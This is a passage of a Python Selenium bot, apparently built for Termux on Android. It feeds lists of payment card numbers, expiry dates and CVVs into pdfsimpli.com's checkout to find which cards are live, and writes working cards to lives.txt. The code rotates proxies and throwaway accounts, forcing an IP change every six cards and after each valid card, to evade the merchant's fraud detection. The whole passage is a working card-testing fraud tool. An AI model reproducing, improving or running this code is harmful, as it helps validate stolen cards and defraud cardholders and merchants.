            print("❌ No se detectó confirmación de pago después de 10 segundos - Tarjeta NO válida")
            return False
                
        except Exception as e:
            print(f"❌ Error verificando resultado: {e}")
            return False

    def guardar_tarjeta_valida(self, tarjeta):
        """Guardar tarjeta válida en archivo lives.txt"""
        try:
            with open(self.archivo_lives, "a", encoding="utf-8") as f:
                linea = f"{tarjeta['numero']}|{tarjeta['mes']}|{tarjeta['anio']}|{tarjeta['cvv']}\n"
                f.write(linea)
            print(f"\033[92m💾 TARJETA VÁLIDA GUARDADA: {tarjeta['numero']}\033[0m")
            return True
        except Exception as e:
            print(f"❌ Error guardando tarjeta válida: {e}")
            return False

    def eliminar_tarjeta_del_archivo(self, tarjeta):
        """Eliminar tarjeta procesada del archivo tarjetas.txt"""
        try:
            if not os.path.exists(self.archivo_tarjetas):
                return False
                
            with open(self.archivo_tarjetas, 'r', encoding='utf-8') as f:
                lineas = f.readlines()
            
            nueva_lineas = []
            tarjeta_encontrada = False
            tarjeta_str = f"{tarjeta['numero']}|{tarjeta['mes']}|{tarjeta['anio']}|{tarjeta['cvv']}"
            
            for linea in lineas:
                linea_limpia = linea.strip()
                if linea_limpia and not linea_limpia.startswith('#'):
                    if linea_limpia == tarjeta_str and not tarjeta_encontrada:
                        tarjeta_encontrada = True
                        continue
                nueva_lineas.append(linea)
            
            if tarjeta_encontrada:
                with open(self.archivo_tarjetas, 'w', encoding='utf-8') as f:
                    f.writelines(nueva_lineas)
                print(f"🗑️  Tarjeta eliminada del archivo: {tarjeta['numero'][:8]}...")
                return True
            return False
            
        except Exception as e:
            print(f"❌ Error eliminando tarjeta del archivo: {e}")
            return False

    def limpiar_pagina_despues_de_error(self):
        """Limpiar la página después de un error"""
        try:
            current_url = self.driver.current_url
            if "pdfsimpli.com/app/billing/confirmation" in current_url:
                return True
            
            # Cerrar botón Close si aparece después del error
            self.cerrar_boton_close_despues_de_error()
            time.sleep(1)
            
            if self.verificar_pagina_pago():
                return True
            else:
                self.driver.refresh()
                time.sleep(3)
                
                if self.verificar_pagina_pago():
                    return True
                else:
                    return False
                    
        except Exception:
            return False

    def cerrar_boton_close_despues_de_error(self):
        """Cerrar botón Close DESPUÉS de error de tarjeta"""
        try:
            print("🔍 Buscando botón Close después de error de tarjeta...")
            
            selectores_boton_close = [
                (By.XPATH, "//button[contains(@class, 'bg-ps-reskin-radial') and contains(text(), 'Close')]"),
                (By.XPATH, "//button[contains(@class, 'bg-ps-reskin-radial')]"),
                (By.XPATH, "//button[contains(text(), 'Close')]"),
            ]
            
            for selector in selectores_boton_close:
                try:
                    boton_close = WebDriverWait(self.driver, 3).until(
                        EC.element_to_be_clickable(selector)
                    )
                    if boton_close and boton_close.is_displayed():
                        print("🔴 Botón Close detectado - CERRANDO después de error")
                        self.driver.execute_script("arguments[0].click();", boton_close)
                        time.sleep(2)
                        print("✅ Botón Close cerrado correctamente")
                        return True
                except:
                    continue
            
            print("✅ No se encontró botón Close después del error")
            return False
            
        except Exception as e:
            print(f"⚠️ Error buscando botón Close después de error: {e}")
            return False

    def ejecutar_flujo_completo(self, datos_tarjeta, numero_tarjeta, cuenta):
        """Ejecutar flujo completo SOLO para PRIMERA tarjeta"""
        try:
            print(f"\033[91m💳 TESTEANDO TARJETA {numero_tarjeta}: {datos_tarjeta['numero']}\033[0m")
            
            ruta_pdf = self.verificar_archivo_pdf()
            if not ruta_pdf:
                return False
                
            self.driver.get("https://pdfsimpli.com")
            time.sleep(2)
            
            pasos = [
                ("Subir PDF", lambda: self.subir_pdf(ruta_pdf)),
                ("Convertir PDF", self.hacer_clic_convert_continue),
                ("Iniciar descarga", self.hacer_clic_descarga),
                ("Registro", lambda: self.manejar_registro(cuenta)),
            ]
            
            for nombre, paso in pasos:
                resultado = paso()
                if not resultado:
                    return False
            
            if not self.verificar_pagina_pago():
                return False
            
            if self.proceso_con_tarjeta_completo(datos_tarjeta, numero_tarjeta):
                return self.verificar_resultado_tarjeta(numero_tarjeta, datos_tarjeta)
            else:
                return False
                
        except Exception as e:
            print(f"❌ Error en flujo completo: {e}")
            return False

    def ejecutar_flujo_tarjeta_rapido(self, datos_tarjeta, numero_tarjeta):
        """Ejecutar flujo rápido para tarjetas posteriores"""
        try:
            if not self.verificar_pagina_pago():
                self.driver.refresh()
                time.sleep(3)
                
                if not self.verificar_pagina_pago():
                    return False
            
            if self.proceso_con_tarjeta_rapido(datos_tarjeta, numero_tarjeta):
                resultado = self.verificar_resultado_tarjeta(numero_tarjeta, datos_tarjeta)
                
                if not resultado:
                    self.limpiar_pagina_despues_de_error()
                
                return resultado
            else:
                return False
                
        except Exception as e:
            print(f"❌ Error en flujo rápido: {e}")
            return False

    def obtener_proxy_aleatorio(self):
        """Obtener un proxy aleatorio de la lista"""
        if not self.proxies:
            return None
        return random.choice(self.proxies)

    def cambiar_cuenta_con_verificacion_ip(self):
        """Cambiar de cuenta con verificación obligatoria de IP"""
        # 1. Obtener IP actual rápidamente
        ip_anterior = self.ip_actual
        
        # 2. Cerrar navegador actual
        if self.driver:
            self.driver.quit()
        
        # 3. Obtener nueva cuenta
        nueva_cuenta = self.obtener_proxima_cuenta()
        if not nueva_cuenta:
            return None
        
        # 4. Configurar nuevo navegador con proxy diferente
        proxy = self.obtener_proxy_aleatorio()
        if proxy and self.configurar_navegador_con_proxy(proxy):
            self.proxy_actual = proxy
        else:
            if not self.configurar_navegador_sin_proxy():
                return None
        
        # 5. Verificación rápida de cambio de IP
        if not self.verificar_cambio_ip(ip_anterior, max_intentos=3):
            return None
        
        return nueva_cuenta

    def verificar_cambio_ip(self, ip_anterior, max_intentos=5):
        """Verificar que la IP ha cambiado"""
        intentos = 0
        while intentos < max_intentos:
            try:
                ip_actual = self.obtener_ip_actual()
                
                if not ip_actual:
                    intentos += 1
                    time.sleep(2)
                    continue
                
                if ip_actual != ip_anterior:
                    return True
                else:
                    # Cambiar proxy rápidamente
                    if self.proxies:
                        proxy = self.obtener_proxy_aleatorio()
                        
                        if self.driver:
                            self.driver.quit()
                        
                        if self.configurar_navegador_con_proxy(proxy):
                            self.proxy_actual = proxy
                        else:
                            if not self.configurar_navegador_sin_proxy():
                                return False
                    
                    intentos += 1
                    time.sleep(3)
                    
            except Exception:
                intentos += 1
                time.sleep(2)
        
        return False

    def cambiar_cuenta_sin_cambiar_ip(self):
        """Cambiar de cuenta manteniendo la misma IP"""
        proxy_actual = self.proxy_actual
        
        if self.driver:
            self.driver.quit()
        
        nueva_cuenta = self.obtener_proxima_cuenta()
        if not nueva_cuenta:
            return None
        
        if proxy_actual and self.configurar_navegador_con_proxy(proxy_actual):
            pass
        else:
            if not self.configurar_navegador_sin_proxy():
                return None
        
        return nueva_cuenta

    def ejecutar_proceso_completo(self):
        """Ejecutar el proceso completo optimizado"""
        try:
            print("🔍 Verificando archivos...")
            print(f"📁 Ruta de archivos: {self.ruta_descargas}")
            
            # Verificar que la carpeta downloads existe
            if not os.path.exists(self.ruta_descargas):
                print(f"❌ No existe la carpeta: {self.ruta_descargas}")
                print("💡 Ejecuta: termux-setup-storage")
                return
            
            tarjetas = self.leer_tarjetas()
            
            if not tarjetas:
                print("❌ No hay tarjetas para procesar")
                return

            print(f"\n🎯 Procesando {len(tarjetas)} tarjetas - MODO FIREFOX")
            print("🔥 NAVEGADOR: Firefox + Geckodriver")
            print("📁 ARCHIVOS EN: /storage/downloads/")
            print("🔴 BOTÓN CLOSE: Se cierra DESPUÉS de cada tarjeta inválida")
            print("⏰ VERIFICACIÓN: 10 segundos para detectar resultado")
            
            cuenta_actual = self.obtener_proxima_cuenta()
            if not cuenta_actual:
                print("❌ No hay cuentas disponibles")
                return
            
            proxy = self.obtener_proxy_aleatorio()
            if proxy and self.configurar_navegador_con_proxy(proxy):
                self.proxy_actual = proxy
                print(f"🔌 Navegador configurado con proxy: {proxy}")
            else:
                if not self.configurar_navegador_sin_proxy():
                    print("❌ No se pudo configurar el navegador")
                    return
                else:
                    print("🔌 Navegador configurado sin proxy")

            ip_actual = self.obtener_ip_actual()
            if ip_actual:
                print(f"🌐 IP actual: {ip_actual}")
            else:
                print("⚠️ No se pudo obtener la IP actual")

            tarjetas_procesadas = 0
            tarjetas_validas = 0
            cuentas_usadas_en_esta_ip = 0
            ip_anterior = self.ip_actual
            
            for i, tarjeta in enumerate(tarjetas, 1):
                print(f"\n💳 {i}/{len(tarjetas)} - Cuenta: {cuenta_actual['email'][:15]}...")
                
                # CAMBIO FORZADO DE IP CADA 6 TARJETAS
                if (i-1) > 0 and (i-1) % 6 == 0:
                    print("🔄 Cambio forzado de IP cada 6 tarjetas...")
                    nueva_cuenta = self.cambiar_cuenta_con_verificacion_ip()
                    if nueva_cuenta:
                        cuenta_actual = nueva_cuenta
                        cuentas_usadas_en_esta_ip = 1
                        ip_anterior = self.ip_actual
                    else:
                        print("❌ No se pudo cambiar la IP, terminando proceso")
                        break
                
                # Cambiar de cuenta si es necesario
                if cuenta_actual.get('tarjetas_procesadas', 0) >= self.max_tarjetas_por_cuenta:
                    cuentas_usadas_en_esta_ip += 1
                    
                    if cuentas_usadas_en_esta_ip >= 3:
                        nueva_cuenta = self.cambiar_cuenta_con_verificacion_ip()
                        if nueva_cuenta:
                            cuenta_actual = nueva_cuenta
                            cuentas_usadas_en_esta_ip = 1
                            ip_anterior = self.ip_actual
                        else:
                            break
                    else:
                        nueva_cuenta = self.cambiar_cuenta_sin_cambiar_ip()
                        if nueva_cuenta:
                            cuenta_actual = nueva_cuenta
                        else:
                            break
            
                if cuenta_actual.get('tarjetas_procesadas', 0) == 0:
                    exito = self.ejecutar_flujo_completo(tarjeta, i, cuenta_actual)
                else:
                    exito = self.ejecutar_flujo_tarjeta_rapido(tarjeta, i)
                
                self.eliminar_tarjeta_del_archivo(tarjeta)
                
                if exito:
                    self.marcar_cuenta_usada(exito=True)
                    tarjetas_procesadas += 1
                    tarjetas_validas += 1
                    print(f"\033[92m✅ TARJETA VÁLIDA {i}: {tarjeta['numero']}\033[0m")
                    
                    # Cambiar cuenta inmediatamente después de tarjeta válida
                    print("🔄 Creando nueva cuenta para la siguiente tarjeta...")
                    nueva_cuenta = self.cambiar_cuenta_con_verificacion_ip()
                    if nueva_cuenta:
                        cuenta_actual = nueva_cuenta
                        cuentas_usadas_en_esta_ip = 1
                        ip_anterior = self.ip_actual
                        print(f"✅ Nueva cuenta creada: {cuenta_actual['email'][:15]}...")
                    else:
                        print("❌ No se pudo crear nueva cuenta, continuando con cuenta actual")
                    
                else:
                    self.marcar_cuenta_usada(exito=False)
                    print(f"\033[91m❌ TARJETA INVÁLIDA {i}: {tarjeta['numero']}\033[0m")
                
                # ESPERA MÍNIMA ENTRE TARJETAS
                if i < len(tarjetas):
                    time.sleep(0.5)
        
            print(f"\n🎉 PROCESO COMPLETADO - VÁLIDAS: {tarjetas_validas}/{len(tarjetas)}")
            print(f"💾 Tarjetas válidas guardadas en: {self.archivo_lives}")
                
        except Exception as e:
            print(f"💥 ERROR: {e}")
            traceback.print_exc()
        finally:
            if self.driver:
                print("🔚 Cerrando navegador...")
                self.driver.quit()

# EJECUCIÓN PRINCIPAL
if __name__ == "__main__":
    print("🤖 BOT PDF SIMPLI - VERSIÓN FIREFOX + GECKODRIVER")
    print("🔥 Optimizado para Termux Android")
    print("📁 Archivos en: /storage/downloads/")
    print("🎯 Procesamiento ultra rápido")
    
    bot = BotPDFSimpli()
    bot.ejecutar_proceso_completo()
    
    input("\n🎯 Presiona ENTER para salir...")